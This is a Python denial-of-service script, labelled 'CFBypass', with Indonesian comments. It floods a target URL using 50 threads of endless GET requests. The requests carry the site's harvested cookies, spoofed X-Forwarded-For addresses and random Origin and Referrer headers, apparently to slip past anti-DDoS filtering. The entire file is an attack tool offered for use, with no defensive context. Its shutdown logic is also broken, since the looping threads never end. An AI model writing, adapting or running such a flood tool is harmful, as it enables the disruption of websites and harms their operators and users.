import requests
import sys
import random
import string
import threading
import time

# Mendapatkan URL dan waktu dari argumen
if len(sys.argv) != 3:
    print('Usage: python bsv.py <url> <time>')
    sys.exit(-1)

url = sys.argv[1]
time_duration = int(sys.argv[2])

# Fungsi untuk menghasilkan byte acak
def random_byte():
    return str(random.randint(0, 255))

# Fungsi untuk menghasilkan string acak
def random_string_generate(length):
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for i in range(length))

# Mendapatkan User-Agent dan Cookie dari halaman awal
response = requests.get(url)
cookie = response.cookies.get_dict()
user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')

# Fungsi untuk mengirimkan permintaan HTTP
def send_request():
    while True:
        try:
            random_string = random_string_generate(10)
            fake_ip = f'{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}'

            headers = {
                'User-Agent': user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': '; '.join([f'{key}={value}' for key, value in cookie.items()]),
                'Origin': f'http://{random_string}.com',
                'Referrer': f'http://google.com/{random_string}',
                'X-Forwarded-For': fake_ip
            }

            requests.get(url, headers=headers)
        except Exception as e:
            print('Failed to get website data:', e)

# Membuat thread untuk mengirimkan permintaan
threads = []
start_time = time.time()

# Jumlah thread yang ingin digunakan (adjust jika diperlukan)
num_threads = 50

for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.start()
    threads.append(thread)

# Menunggu hingga waktu habis
while time.time() - start_time <= time_duration:
    time.sleep(1)

# Menghentikan semua thread
for thread in threads:
    thread.join()

print("CFBypass selesai.")
